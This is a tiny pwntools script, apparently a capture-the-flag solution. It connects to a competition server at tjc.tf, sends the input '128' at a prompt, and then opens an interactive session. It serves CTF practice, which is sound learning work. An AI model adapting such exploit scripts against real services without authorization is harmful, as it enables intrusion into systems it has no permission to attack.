#!usr/bin/python3
from pwn import *

io = remote("tjc.tf", 31601)

io.sendlineafter(b'Input: ', b'128')
io.interactive()